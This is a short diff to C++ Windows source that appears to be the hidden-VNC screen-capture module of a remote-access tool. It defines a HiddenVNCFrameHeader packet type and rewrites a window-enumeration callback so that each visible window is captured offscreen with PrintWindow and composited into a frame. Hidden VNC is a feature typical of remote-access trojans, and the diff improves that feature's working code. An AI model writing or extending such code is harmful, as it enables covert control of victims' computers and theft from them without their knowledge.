@@ -1,6 +1,7 @@
 #define WIN32_LEAN_AND_MEAN
 #include <winsock2.h>
 #include <windows.h>
+#include <propidl.h>
 #include <gdiplus.h>
 #include <objidl.h>
 #include <algorithm>
@@ -41,6 +42,10 @@ struct HiddenVNCFrameHeader {
 static const uint16_t PACKET_SIGNATURE = 0x524E;
 static const uint8_t PACKET_TYPE_HIDDEN_VNC_FRAME = 0x06;
 static const uint32_t MONITOR_FRAME_FORMAT_JPEG = 1;
+
+#ifndef PW_RENDERFULLCONTENT
+#define PW_RENDERFULLCONTENT 0x00000002
+#endif
 
 static atomic_bool g_captureRunning(false);
 static thread g_captureThread;
@@ -125,9 +130,22 @@ struct EnumData {
 BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
     if (!IsWindowVisible(hwnd)) return TRUE;
     EnumData* data = (EnumData*)lParam;
+
     RECT rect;
     GetWindowRect(hwnd, &rect);
-    PrintWindow(hwnd, data->hdcMem, PW_RENDERFULLCONTENT);
+
+    HDC hdcWindow = CreateCompatibleDC(data->hdcMem);
+    HBITMAP hbmWindow = CreateCompatibleBitmap(data->hdcMem, rect.right - rect.left, rect.bottom - rect.top);
+    HGDIOBJ old = SelectObject(hdcWindow, hbmWindow);
+
+    if (PrintWindow(hwnd, hdcWindow, PW_RENDERFULLCONTENT)) {
+        BitBlt(data->hdcMem, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, hdcWindow, 0, 0, SRCCOPY);
+    }
+
+    SelectObject(hdcWindow, old);
+    DeleteObject(hbmWindow);
+    DeleteDC(hdcWindow);
+
     return TRUE;
 }
 
